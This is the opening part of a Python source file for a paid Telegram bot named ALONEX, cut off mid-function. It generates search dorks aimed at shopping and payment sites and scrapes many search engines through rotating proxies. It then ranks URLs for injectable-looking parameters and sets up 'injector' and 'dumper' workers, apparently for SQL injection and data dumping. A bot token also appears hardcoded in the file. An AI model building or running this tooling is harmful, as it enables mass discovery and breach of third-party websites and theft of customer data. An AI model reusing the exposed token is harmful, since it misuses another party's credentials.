#!/usr/bin/env python3
import os, io, re, time, random, json, asyncio, aiohttp, requests, zipfile, secrets, threading, socket
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, wait
from urllib.parse import quote_plus, urlparse, parse_qs, urlencode, urlunparse
import telebot
from telebot import types
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    


# ============ 💎 PREMIUM EMOJI DICTIONARY ============
E = {
    "tick": '<tg-emoji emoji-id="6080008021214239615">✅</tg-emoji>',
    "cross": '<tg-emoji emoji-id="6080308419816857170">❌</tg-emoji>',
    "skull": '<tg-emoji emoji-id="5042209657527993345">💀</tg-emoji>',
    "user": '<tg-emoji emoji-id="6080075366301441237">👤</tg-emoji>',
    "zap": '<tg-emoji emoji-id="5890847821728322055">⚡</tg-emoji>',
    "globe": '<tg-emoji emoji-id="6028126693179264852">🌍</tg-emoji>',
    "ticket": '<tg-emoji emoji-id="6294307957068798565">🎫</tg-emoji>',
    "shield": '<tg-emoji emoji-id="6028117381690167734">🛡️</tg-emoji>',
    "robot": '<tg-emoji emoji-id="5767399771467684455">🤖</tg-emoji>',
    "brain": '<tg-emoji emoji-id="5314413943035278948">🧠</tg-emoji>',
    "dna": '<tg-emoji emoji-id="5314413943035278948">🧬</tg-emoji>',
    "syringe": '<tg-emoji emoji-id="5256169350368353876">💉</tg-emoji>',
    "blood": '<tg-emoji emoji-id="5917896855743631129">🩸</tg-emoji>',
    "folder": '<tg-emoji emoji-id="5341492148468465410">📂</tg-emoji>',
    "disk": '<tg-emoji emoji-id="5861905643438347289">💾</tg-emoji>',
    "gem": '<tg-emoji emoji-id="5767137507879685567">💎</tg-emoji>',
    "gift": '<tg-emoji emoji-id="5041975203853239332">🎁</tg-emoji>',
    "cart": '<tg-emoji emoji-id="5258024802010026053">🛒</tg-emoji>',
    "money": '<tg-emoji emoji-id="5197434882321567830">💰</tg-emoji>',
    "gear": '<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji>',
    "lock": '<tg-emoji emoji-id="5393302369024882368">🔐</tg-emoji>',
    "star": '<tg-emoji emoji-id="5042176294222037888">🌟</tg-emoji>',
    "search": '<tg-emoji emoji-id="5258274739041883702">🔍</tg-emoji>',
    "horn": '<tg-emoji emoji-id="5424818078833715060">📢</tg-emoji>',
    "web": '<tg-emoji emoji-id="5341357711697134290">🕸️</tg-emoji>',
    "puzzle": '<tg-emoji emoji-id="5039673964671009665">🧩</tg-emoji>',
    "chart": '<tg-emoji emoji-id="5244837092042750681">📊</tg-emoji>',
    "eye": '<tg-emoji emoji-id="5039623284056917259">👁️</tg-emoji>',
    "target": '<tg-emoji emoji-id="5256131095094652290">🎯</tg-emoji>',
    "rocket": '<tg-emoji emoji-id="6098070360148677050">🚀</tg-emoji>',
    "warn": '<tg-emoji emoji-id="5447644880824181073">⚠️</tg-emoji>'
}


BOT_TOKEN = "8907417771:AAEVcZtypGw930p15jzV8f8zV4Sgg2FYuK4"
OWNER_ID = 7899583720
BASE_DIR=os.path.dirname(os.path.abspath(__file__))
def P(n): return os.path.join(BASE_DIR,n)

USERS_DB=P("users.json"); KEYS_DB=P("keys.json"); ADMINS_DB=P("admins.json"); UPROX_DB=P("user_proxies.json")
STATS_DB=P("stats.json"); SET_FILE=P("settings.json"); VULN_CACHE=P("vuln_cache.json")
FILES_DIR=P("user_files"); DOOM_IMG=P("doom.jpg"); KW_W=P("kw_weights.json"); EW_FILE=P("eng_weights.json")
GOOD_D=P("good_dorks.txt"); COMBOS=P("combos.json")
RES_FILES={"sites":P("sites.txt"),"keywords":P("keywords.txt"),"page_types":P("page_types.txt"),"page_parameters":P("page_parameters.txt"),"patterns":P("patterns.txt")}

LINE="━━━━━━━━━━━━━━━━━━━━"; TIMEOUT=8; MAX_DORKS=1000000; TARGET_RPS=30
HDR={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":"en-US,en;q=0.9"}
UA_POOL=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15","Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0","Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"]

MODES={"turbo":{"workers":200,"timeout":4,"tables":5,"rows":25,"pages":1},"fast":{"workers":100,"timeout":5,"tables":5,"rows":25,"pages":1},"balanced":{"workers":50,"timeout":8,"tables":10,"rows":50,"pages":2},"deep":{"workers":30,"timeout":12,"tables":20,"rows":100,"pages":3}}
PRESETS={"shopping":["buy","price","discount","sneakers","watch","handbag","electronics","fashion","jewelry","laptop"],"custom":[],"default":[]}
DEFAULT_PLANS=[{"name":"Basic","price":"$5","days":7},{"name":"Pro","price":"$15","days":30},{"name":"Elite","price":"$40","days":90}]

KM_MODS=["buy","cheap","best","top","review","reviews","discount","deal","deals","online","shop","store","price","for sale","wholesale","supplier","login","portal","admin","dashboard","download","free","premium","account","subscription","offer","promo","new arrival"]
KM_PLATS=["paypal","stripe","shopify","woocommerce","magento","prestashop","amazon","ebay","etsy","aliexpress","walmart","target"]
KM_YEARS=["2024","2025","2026"]
GOODP=["id=","pid=","cat=","item=","product=","page=","view=","detail=","category=","article=","news=","file=","doc=","order=","user=","q=","search="]
GOODX=(".php",".asp",".aspx",".jsp",".cfm",".phtml")
JUNK=["wp-admin","wp-login","login","cart","checkout","register","signup",".js",".css",".png",".jpg",".ico",".pdf","mailto:"]
JUNKH=["/search","/accounts","/login","javascript:","mailto:","#","/cart","/checkout"]

PROXY_SRC=["https://raw.githubusercontent.com/monosans/proxies/proxy/http.txt","https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt","https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt","https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt","https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all","https://proxyspace.pro/http.txt","https://proxyspace.pro/https.txt","https://api.openproxylist.xyz/http.txt"]
CHECK_EPS=["https://api.ipify.org","https://icanhazip.com","https://checkip.amazonaws.com","https://ifconfig.me/ip","https://wtfismyip.com/text"]

EMO={"ddg":"🦆","bing":"🅱️","yahoo":"🟡","brave":"🦁","mojeek":"🟢","google":"🇬","ecosia":"🌳","ask":"❓","yep":"✅"}
ALL_ENGINES=["ddg","bing","yahoo","brave","mojeek","ecosia","ask","yep","google"]
LANG_TXT={"en":{"cap":"👇 Choose your weapon:","ver":"✅ Verified! Welcome aboard.","lic":"🚫 LICENSE REQUIRED"},"ur":{"cap":"👇 Apna hathiyar chuno:","ver":"✅ Tasdeeq mukammal!","lic":"🚫 LICENSE ZAROORI HA"},"hi":{"cap":"👇 Apna hathiyar chuno:","ver":"✅ Verification ho gayi!","lic":"🚫 LICENSE CHAHIYE"}}

try:
    import resource
    resource.setrlimit(resource.RLIMIT_NOFILE,(65535,65535))
except: pass

INJ_CONN=100; INJ_BATCH=128
DUMP_WORKERS=12; DUMP_DEADLINE=60
BANNERS={"main":P("main.jpg"),"parser":P("parser.jpg"),"injector":P("injector.jpg"),"dumper":P("dumper.jpg"),"proxies":P("proxies.jpg"),"keywords":P("keywords.jpg"),"dorker":P("dorker.jpg"),"admin":P("admin.jpg"),"plans":P("plans.jpg"),"combos":P("combos.jpg")}

CUR={}; PARENT={"home":"home","proxy":"home","admin":"home","combos":"home","gen":"home","km":"home","parse":"home","inject":"home","data":"home","plans":"home","speed":"home","lic":"home","help":"home","subs":"home","files":"home","ref":"home","parse_eng":"parse","parse_threads":"parse","gen_count":"gen","gen_amount":"gen","km_count":"km","combo_name":"combos","combo_kws":"combos","data_filter":"data","inject_threads":"inject","set_chunk":"admin","set_capkey":"admin","pem_cap":"admin","cap_url":"home"}

# ============ 🧿 FULL LOCKS ============
STATES_LOCK=threading.Lock(); JOBS_LOCK=threading.Lock(); CUR_LOCK=threading.Lock(); RATE_LOCK=threading.Lock(); MEM_LOCK=threading.Lock()

def set_cur(uid,s):
    with CUR_LOCK: CUR[uid]=s

# ============ ⚡ SPEED TUNING ============
telebot.apihelper.ENABLE_MIDDLEWARE=True
try:
    telebot.apihelper.CONNECT_TIMEOUT=5; telebot.apihelper.READ_TIMEOUT=10
except: pass

try: bot=telebot.TeleBot(BOT_TOKEN, threaded=True, num_workers=16, skip_pending=True)
except TypeError:
    try: bot=telebot.TeleBot(BOT_TOKEN, threaded=True, skip_pending=True)
    except TypeError: bot=telebot.TeleBot(BOT_TOKEN, threaded=True)
try: ME=bot.get_me(); BOT_USERNAME=ME.username
except: BOT_USERNAME=""
states={}; JOBS={}; LAST={}; AUTO={}; AUTO_LOCK=threading.Lock(); RATE_LIMITS={}
PHOTO_FC={}

# ============ 🧿 SHARED LOOP ============
LOOP=None
def _boot_loop():
    global LOOP
    LOOP=asyncio.new_event_loop(); asyncio.set_event_loop(LOOP); LOOP.run_forever()

threading.Thread(target=_boot_loop,daemon=True).start()
for _ in range(200):
    if LOOP is not None: break
    time.sleep(0.01)

def _run_on_loop(coro): return asyncio.run_coroutine_threadsafe(coro,LOOP).result()

# ============ HELPERS (RAM-CACHED JSON) ============
_MEM={}
def load_json(n,d):
    try: mt=os.path.getmtime(n)
    except:
        with MEM_LOCK: _MEM.pop(n,None)
        return d
    with MEM_LOCK: e=_MEM.get(n)
    if e and e[0]==mt: return e[1]
    try:
        with open(n,"r",encoding="utf-8") as f: v=json.load(f)
    except: return d
    with MEM_LOCK: _MEM[n]=(mt,v)
    return v

def save_json(n,d):
    with open(n,"w",encoding="utf-8") as f: json.dump(d,f,separators=(",",":"))
    try: mt=os.path.getmtime(n)
    except: mt=time.time()
    with MEM_LOCK: _MEM[n]=(mt,d)

def read_lines(p):
    try:
        with open(p,"r",encoding="utf-8") as f: return [x.strip() for x in f if x.strip()]
    except: return []

def sbtn(t,c,style=None):
    # Enforcing ALL CAPS for a modern, clean UI look
    t = t.upper()
    if style is None: return types.InlineKeyboardButton(t,callback_data=c)
    try: return types.InlineKeyboardButton(t,callback_data=c,style=style)
    except Exception:
        b=types.InlineKeyboardButton(t,callback_data=c)
        try: b.style=style
        except Exception: pass
        return b

def btn(t,c): return sbtn(t,c)
def ubtn(t,u): return types.InlineKeyboardButton(t.upper(),url=u)

def bar(d,t,w=10):
    if t<=0: return "░"*w
    p=int(w*d/t); return "█"*p+"░"*(w-p)

def pct(d,t): return int(d*100/t) if t else 0

def get_text(m):
    if m.content_type == "document":
        try:
            if m.document.file_size > 20 * 1024 * 1024:
                return "FILE_TOO_LARGE"
            f = bot.get_file(m.document.file_id)
            data = bot.download_file(f.file_path)
            if hasattr(data, "read"): data = data.read()
            return data.decode("utf-8", "ignore")
        except Exception: 
            return "DOWNLOAD_ERROR"
    return m.text or ""
    

def fmt_eta(sec):
    try:
        if sec <= 0: return "0s"
        sec = int(sec)
        if sec > 86400*365: return "—"
        d, sec = divmod(sec, 86400)
        h, sec = divmod(sec, 3600)
        m, s = divmod(sec, 60)
        if d: return f"{d}d {h}h {m}m"
        if h: return f"{h}h {m}m {s}s"
        if m: return f"{m}m {s}s"
        return f"{s}s"
    except Exception:
        return "—"

def eta_line(start_t, done, total):
    try:
        if done <= 0 or total <= 0: return "⏱ <b>𝙏𝙄𝙈𝙀 𝙇𝙀𝙁𝙏:</b> <i>𝙇𝙤𝙖𝙙𝙞𝙣𝙜....𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩</i>\n🎯 <b>𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀 𝘼𝙏:</b> <i>𝙇𝙤𝙖𝙙𝙞𝙣𝙜....𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩</i>"
        elapsed = time.time() - start_t
        if elapsed < 3: return "⏱ <b>𝙏𝙄𝙈𝙀 𝙇𝙀𝙁𝙏:</b> <i>𝙇𝙤𝙖𝙙𝙞𝙣𝙜....𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩</i>\n🎯 <b>𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀 𝘼𝙏:</b> <i>𝙇𝙤𝙖𝙙𝙞𝙣𝙜....𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩</i>"
        rate = done / elapsed
        if rate <= 0: return "⏱ <b>𝙏𝙄𝙈𝙀 𝙇𝙀𝙁𝙏:</b> <i>𝙇𝙤𝙖𝙙𝙞𝙣𝙜....𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩</i>\n🎯 <b>𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀 𝘼𝙏:</b> <i>𝙇𝙤𝙖𝙙𝙞𝙣𝙜....𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩</i>"
        left_sec = (total - done) / rate
        if left_sec < 0 or left_sec > 86400*365: return "⏱ <b>𝙏𝙄𝙈𝙀 𝙇𝙀𝙁𝙏:</b> <i>𝙇𝙤𝙖𝙙𝙞𝙣𝙜....𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩</i>\n🎯 <b>𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀 𝘼𝙏:</b> <i>𝙇𝙤𝙖𝙙𝙞𝙣𝙜....𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩</i>"
        finish = datetime.fromtimestamp(time.time() + left_sec)
        return (f"⏱ <b>𝙏𝙄𝙈𝙀 𝙇𝙀𝙁𝙏:</b> <code>{fmt_eta(left_sec)}</code>\n"
                f"🎯 <b>𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀 𝘼𝙏:</b> <code>{finish:%d %b %Y, %I:%M %p}</code>")
    except Exception:
        return "⏱ <b>𝙏𝙄𝙈𝙀 𝙇𝙀𝙁𝙏:</b> <i>𝙇𝙤𝙖𝙙𝙞𝙣𝙜....𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩</i>\n🎯 <b>𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀 𝘼𝙏:</b> <i>𝙇𝙤𝙖𝙙𝙞𝙣𝙜....𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩</i>"
    

def lines_of(t): return [x.strip() for x in (t or "").splitlines() if x.strip()]

def admins():
    a=load_json(ADMINS_DB,[])
    if OWNER_ID not in a: a.append(OWNER_ID)
    return a

def S(): return load_json(SET_FILE,{})
def setS(d): save_json(SET_FILE,d)
def sget(k,d=None): return S().get(k,d)

def U(uid): return load_json(USERS_DB,{}).get(str(uid),{})
def setU(uid,patch):
    d=load_json(USERS_DB,{}); d.setdefault(str(uid),{}).update(patch); save_json(USERS_DB,d)

def uprox(uid): return load_json(UPROX_DB,{}).get(str(uid),[])
def hprox(uid): return [p for p in uprox(uid) if p.startswith("http")]
def set_uprox(uid,l):
    d=load_json(UPROX_DB,{}); d[str(uid)]=l; save_json(UPROX_DB,d)

def get_mode(uid): return MODES.get(U(uid).get("mode","turbo"),MODES["turbo"])
def L(uid): return LANG_TXT.get(U(uid).get("lang","en"),LANG_TXT["en"])

def bump(k):
    s=load_json(STATS_DB,{}); s[k]=s.get(k,0)+1; save_json(STATS_DB,s)

def bumpU(uid,k):
    st=U(uid).get("stats",{}); st[k]=st.get(k,0)+1; setU(uid,{"stats":st})

def ew_get(): return load_json(EW_FILE,{})

def fix_url(u):
    u=(u or "").strip()
    if not u: return "https://t.me/"
    if u.startswith("@"): return "https://t.me/"+u[1:]
    if u.startswith("http"): return u
    return "https://"+u

def plans(): return sget("plans",DEFAULT_PLANS)

def new_job():
    jid=secrets.token_hex(4)
    with JOBS_LOCK: JOBS[jid]={"stop":False,"start":time.time()}
    return jid

def stopped(jid):
    with JOBS_LOCK: return JOBS.get(jid,{}).get("stop",False)

def stop_markup(jid):
    mk=types.InlineKeyboardMarkup(); mk.add(sbtn("STOP PROCESS","stop:"+jid,"danger")); return mk

def clear_markup(cid,mid):
    try: bot.edit_message_reply_markup(cid,mid,reply_markup=types.InlineKeyboardMarkup())
    except: pass

def back_row(mk):
    mk.add(btn("BACK","back")); return mk

def send_banner(cid, key, text, mk, parse_mode="HTML"):
    p=BANNERS.get(key)
    if p and os.path.exists(p):
        fid=PHOTO_FC.get(key)
        try:
            if fid:
                bot.send_photo(cid,fid,caption=text,reply_markup=mk,parse_mode=parse_mode); return
            with open(p,"rb") as f: m=bot.send_photo(cid,f,caption=text,reply_markup=mk,parse_mode=parse_mode)
            try: PHOTO_FC[key]=m.photo[-1].file_id
            except: pass
            return
        except Exception: PHOTO_FC.pop(key,None)
    bot.send_message(cid,text,reply_markup=mk,parse_mode=parse_mode)


def cap_balance():
    k=sget("captcha_api")
    if not k: return None
    try: return requests.get(f"https://2captcha.com/res.php?key={k}&action=getbalance&json=1",timeout=6).json().get("balance")
    except: return None

def prem_line():
    if sget("emoji_mode","normal")!="premium": return ""
    g=sget("pem",{}) or {}
    if not g: return ""
    return "".join(f'<tg-emoji emoji-id="{v}">•</tg-emoji>' for v in list(g.values())[:6])+"\n"

def store_file(uid,data,name):
    d=os.path.join(FILES_DIR,str(uid)); os.makedirs(d,exist_ok=True)
    ip=os.path.join(d,"index.json"); idx=load_json(ip,[])
    safe=re.sub(r"[^A-Za-z0-9_.\-]","_",name); fname=str(int(time.time()))+"_"+safe
    with open(os.path.join(d,fname),"wb") as f: f.write(data)
    idx.append({"f":fname,"n":name,"t":int(time.time())})
    while len(idx)>5:
        old=idx.pop(0)
        try: os.remove(os.path.join(d,old["f"]))
        except: pass
    save_json(ip,idx)

# ============ 🌐 GH VAULT (BIG FILES → WEBSITE) ============
GH_CFG=P("gh_config.json")
def gh_conf(): return load_json(GH_CFG,{})
def gh_upload(uid,data,name):
    import base64
    c=gh_conf(); tok=c.get("token",""); repo=c.get("repo","")
    if not tok or "/" not in repo: return None
    H={"Authorization":"token "+tok,"Accept":"application/vnd.github+json"}
    base=f"https://api.github.com/repos/{repo}/contents/"
    safe=re.sub(r"[^A-Za-z0-9_.\-]","_",name)[:40] or "file.txt"
    newp="files/"+str(uid)+"_"+safe
    try:
        ir=requests.get(base+"index.json",headers=H,timeout=15)
        sha_idx=None; files={}
        if ir.status_code==200:
            import base64 as b64
            idx=json.loads(b64.b64decode(ir.json().get("content","")))
            sha_idx=ir.json().get("sha")
            files=idx.get("files",{}) if isinstance(idx,dict) else {}
        old=(files.get(str(uid)) or {}).get("path")
        r=requests.put(base+newp,headers=H,json={"message":"vault "+str(uid),"content":base64.b64encode(data).decode()},timeout=120)
        if r.status_code not in (200,201): return None
        if old and old!=newp:
            o=requests.get(base+old,headers=H,timeout=15)
            if o.status_code==200:
                requests.delete(base+old,headers=H,json={"message":"rm old","sha":o.json().get("sha")},timeout=30)
        files[str(uid)]={"path":newp,"name":name,"size":len(data),"ts":int(time.time())}
        body={"message":"idx","content":base64.b64encode(json.dumps({"files":files}).encode()).decode()}
        if sha_idx: body["sha"]=sha_idx
        requests.put(base+"index.json",headers=H,json=body,timeout=30)
        owner,repoN=repo.split("/",1)
        site=c.get("site","").rstrip("/")
        if site: return f"{site}/?u={uid}&r={repo}"
        return f"https://{owner}.github.io/{repoN}/?u={uid}&r={repo}"
    except: return None

def send_doc(cid,data,name,uid=None,store=True):
    minb=int(gh_conf().get("min_kb",500) or 0)*1024
    if uid and minb and len(data)>=minb:
        link=gh_upload(uid,data,name)
        if link:
            try: bot.send_message(cid, f"<blockquote><b>{E['folder']} FILE UPLOADED TO VAULT\n{LINE}\n{E['disk']} {name} ({len(data)//1024} KB)\n{E['globe']} SECURE LINK: {link}</b></blockquote>", parse_mode="HTML")
            except: pass
            if store: store_file(uid,data,name)
            return
    bio=io.BytesIO(data); bio.name=name; bot.send_document(cid,bio)
    if store and uid: store_file(uid,data,name)
    ch=sget("results_channel")
    if ch:
        try:
            b2=io.BytesIO(data); b2.name=name; bot.send_document(ch,b2)
        except: pass

def html_report(title,rows):
    tr="".join(f"<tr><td>{r.get('url','')}</td><td>{r.get('type','')}</td><td>{r.get('param','')}</td><td>{r.get('sig','')}</td></tr>" for r in rows)
    return f"<html><head><meta charset='utf-8'><title>{title}</title><style>body{{font-family:monospace;background:#0d0d0d;color:#00ff88;padding:16px}}h1{{color:#ff0044}}table{{border-collapse:collapse;width:100%}}td,th{{border:1px solid #333;padding:6px;font-size:12px;text-align:left}}th{{background:#1a1a1a;color:#fff}}</style></head><body><h1>🌑 {title}</h1><p>Generated: {datetime.now():%Y-%m-%d %H:%M} | ALONEX</p><table><tr><th>URL</th><th>Type</th><th>Param</th><th>Proof</th></tr>{tr}</table></body></html>"

# ============ LICENSE / REF ============
def is_banned(uid): return uid in sget("banned",[])

def ban(uid):
    st=S(); b=st.setdefault("banned",[])
    if uid not in b: b.append(uid); setS(st)

def license_until(uid):
    u=U(uid); now=time.time(); rev=u.get("revoked_at",0); best=0
    al=u.get("admin_lic",0) or 0
    if al>now and al>best: best=al
    bu=u.get("bonus_until",0) or 0
    if bu>now and bu>best: best=bu
    for v in load_json(KEYS_DB,{}).values():
        if v.get("activated_by")==uid and v.get("activated_at"):
            if v["activated_at"]<rev: continue
            exp=v["activated_at"]+v["hours"]*3600
            if exp>now and exp>best: best=exp
    return best if best>now else None

def has_license(uid): return license_until(uid) is not None

def redeem(uid,key):
    keys=load_json(KEYS_DB,{}); k=keys.get(key.strip())
    if not k: return f"{E['cross']} INVALID KEY DETECTED!"
    if k.get("activated_by"): return f"{E['cross']} THIS KEY IS ALREADY USED!"
    k["activated_by"]=uid; k["activated_at"]=time.time(); save_json(KEYS_DB,keys)
    return f"{E['tick']} LICENSE ACTIVATED\n{LINE}\n{E['ticket']} VALID TILL: {datetime.fromtimestamp(k['activated_at']+k['hours']*3600):%d %b %Y %H:%M}"

def lic_gate(cid,uid):
    if not has_license(uid):
        bot.send_message(cid, f"<blockquote><b>{E['cross']} {L(uid)['lic'].upper()}\n{LINE}\n{E['gem']} /PLANS | {E['ticket']} /REDEEM | {E['gift']} /REFER</b></blockquote>", parse_mode="HTML")
        return False
    return True

def add_flag(uid,reason):
    st=S(); fl=st.setdefault("flags",[])
    fl.append({"uid":uid,"u":U(uid).get("username","?"),"r":reason,"t":int(time.time())})
    n=sum(1 for f in fl if f["uid"]==uid)
    if st.get("auto_ban",True) and n>=st.get("flag_threshold",3) and uid not in st["banned"]: st["banned"].append(uid)
    setS(st)

def fake_check(uid,username,first_name):
    d=load_json(USERS_DB,{})
    for oid,ov in d.items():
        if oid==str(uid) or not ov.get("referred_by"): continue
        if username and ov.get("username")==username: return True
        if first_name and ov.get("first_name")==first_name and not username and not ov.get("username"): return True
    return False

def dead_ratio_check(rb):
    d=load_json(USERS_DB,{}); now=time.time()
    refs=[v for v in d.values() if v.get("referred_by")==rb]
    if len(refs)<6: return
    dead=sum(1 for v in refs if not v.get("ref_counted") and now-v.get("since",now)>48*3600)
    if dead/len(refs)>0.6: add_flag(rb,"60%+ DEAD REFERS")

def qualify_ref(uid):
    u=U(uid); rb=u.get("referred_by")
    if not rb or u.get("ref_counted"): return
    setU(uid,{"ref_counted":True})
    newc=U(rb).get("ref_count",0)+1
    patch={"ref_count":newc}
    if newc%sget("ref_need",5)==0:
        patch["bonus_until"]=max(time.time(),U(rb).get("bonus_until",0))+sget("ref_reward_days",1)*86400
        try: bot.send_message(rb, f"<blockquote><b>{E['gift']} REFERRAL REWARD\n{LINE}\n{E['tick']} +{sget('ref_reward_days',1)} DAYS ADDED TO YOUR LICENSE!</b></blockquote>", parse_mode="HTML")
        except: pass
    setU(rb,patch); dead_ratio_check(rb)

def missing_channels(uid):
    miss=[]
    for ch in sget("channels",[]):
        try:
            st=bot.get_chat_member(ch["id"],uid).status
            if st not in ("member","administrator","creator"): miss.append(ch)
        except: continue
    return miss

def join_screen(cid,uid):
    miss=missing_channels(uid)
    if not miss:
        setU(uid,{"joined":True}); qualify_ref(uid); send_main(cid,uid); return
    mk=types.InlineKeyboardMarkup()
    for ch in miss: mk.add(ubtn(f"JOIN {ch.get('name','CHANNEL').upper()}",ch["link"]))
    mk.add(sbtn("VERIFY SUBSCRIPTION","join:verify","success"))
    bot.send_message(cid, f"<blockquote><b>{E['horn']} SUBSCRIPTION REQUIRED\n{LINE}\n{E['cross']} YOU MUST JOIN THE CHANNELS BELOW TO USE ALONEX.</b></blockquote>", reply_markup=mk, parse_mode="HTML")

def new_captcha(uid):
    a,b=random.randint(2,12),random.randint(2,9)
    op=random.choice(["+","-","x","÷"])
    if op=="+": ans,q=a+b,f"{a} + {b}"
    elif op=="-": ans,q=a-b,f"{a} - {b}"
    elif op=="x": ans,q=a*b,f"{a} × {b}"
    else: ans,q=a,f"{a*b} ÷ {b}"
    opts={ans}
    while len(opts)<4: opts.add(ans+random.choice([-3,-2,-1,1,2,3]))
    opts=sorted(opts,key=lambda x:random.random())
    with STATES_LOCK: states[uid]=("captcha",{"ans":ans})
    # Keys should be converted to string, the sbtn implicitly uppercases, which is fine for numbers
    mk=types.InlineKeyboardMarkup(); mk.row(*[btn(str(o),f"cap:{o}") for o in opts])
    return q,mk


# ============ ASYNC HTTP + PARSER v2 ============
async def a_get(s,url,proxy=None,to=None,headers=None):
    try:
        async with s.get(url,proxy=proxy,ssl=False,timeout=aiohttp.ClientTimeout(total=to or TIMEOUT),headers=headers) as r:
            return await r.text(),r.status
    except: return None,0

async def a_get_fb(s,url,proxy=None,to=None,headers=None):
    t,st=await a_get(s,url,proxy,to,headers)
    if t is None or st!=200: t,st=await a_get(s,url,None,to,headers)
    return t,st

ENG_SEL={"ddg":(".result__a",["duckduckgo"]),"bing":("li.b_algo h2 a",["bing.com"]),"yahoo":("h3 a",["yahoo.","search.yahoo"]),"brave":("div.result a",["brave.com"]),"mojeek":("h2 a",["mojeek"]),"google":("div.g a",["google.","webcache","youtube."]),"ecosia":("article.result a, .result a",["ecosia.org"]),"ask":("a[class*='title'], .search-result a",["ask.com"]),"yep":("div[aria-label] a, a.result-link",["yep.com"])}

def clean_href(h,selfdom):
    if h.startswith("/url?"):
        qq=parse_qs(urlparse(h).query).get("t") or parse_qs(urlparse(h).query).get("q")
        h=qq[0] if qq else ""
    if h.startswith("//"): h="https:"+h
    if not h.startswith("http") or len(h)<15: return None
    if any(x in h for x in selfdom+JUNKH): return None
    return h

async def a_eng(s,dork,eng,pg,fresh,proxy):
    hd={**HDR,"User-Agent":random.choice(UA_POOL)}
    fr={"d":"&filters=ex1%3A%22ez1%22","w":"&filters=ex1%3A%22ez2%22"}.get(fresh,"")
    if eng=="ddg": url=f"https://html.duckduckgo.com/html/?q={quote_plus(dork)}"
    elif eng=="bing": url=f"https://www.bing.com/search?q={quote_plus(dork)}&count=50&first={1+pg*50}"+fr
    elif eng=="yahoo": url=f"https://search.yahoo.com/search?p={quote_plus(dork)}&b={1+pg*10}"
    elif eng=="brave": url=f"https://search.brave.com/search?q={quote_plus(dork)}&offset={pg}"+({"d":"&tf=pd","w":"&tf=pw"}.get(fresh,""))
    elif eng=="mojeek": url=f"https://www.mojeek.com/search?q={quote_plus(dork)}&start={pg*10}"
    elif eng=="ecosia": url=f"https://www.ecosia.org/search?q={quote_plus(dork)}"
    elif eng=="ask": url=f"https://www.ask.com/web?q={quote_plus(dork)}"
    elif eng=="yep": url=f"https://yep.com/web?q={quote_plus(dork)}"
    else: url=f"https://www.google.com/search?q={quote_plus(dork)}&num=50&start={pg*50}"+({"d":"&tbs=qdr:d","w":"&tbs=qdr:w"}.get(fresh,""))
    t,st=await a_get_fb(s,url,proxy,headers=hd)
    if st in (403,429,503): t,st=await a_get_fb(s,url,proxy,headers={**HDR,"User-Agent":random.choice(UA_POOL)})
    out=[]
    if t and st==200:
        soup=BeautifulSoup(t,"html.parser"); sel=ENG_SEL[eng]
        for a in soup.select(sel[0]):
            h=clean_href(a.get("href",""),sel[1])
            if h: out.append(h)
        if not out:
            for a in soup.select("a[href]"):
                h=clean_href(a.get("href",""),sel[1])
                if h: out.append(h)
        if eng=="ddg" and not out:
            t2,_=await a_get(s,f"https://lite.duckduckgo.com/lite/?q={quote_plus(dork)}",proxy,headers=hd)
            if t2:
                for a in BeautifulSoup(t2,"html.parser").select("a"):
                    h=clean_href(a.get("href",""),["duckduckgo"])
                    if h: out.append(h)
    if out: return out,200
    if not t: return None,st
    return out,st

def score_url(u):
    u=u.lower(); s=0
    if any(k in u for k in GOODP): s+=3
    if any(u.split("?")[0].endswith(x) for x in GOODX): s+=2
    if urlparse(u).path.count("/")>=3: s+=1
    if any(k in u for k in JUNK): s-=6
    return s

def uhq_filter(urls):
    seen=set(); domc={}; out=[]
    for u in sorted(urls,key=score_url,reverse=True):
        p=urlparse(u); key=p.netloc+p.path
        if key in seen: continue
        seen.add(key)
        if domc.get(p.netloc,0)>=4: continue
        domc[p.netloc]=domc.get(p.netloc,0)+1
        out.append(u)
    return out

def scope_filter(urls):
    scope=sget("scope",[])
    if not scope or not sget("scope_on",False): return urls
    return [u for u in urls if any(urlparse(u).netloc.lower().endswith(s) or s in urlparse(u).netloc.lower() for s in scope)]

def dns_filter(urls):
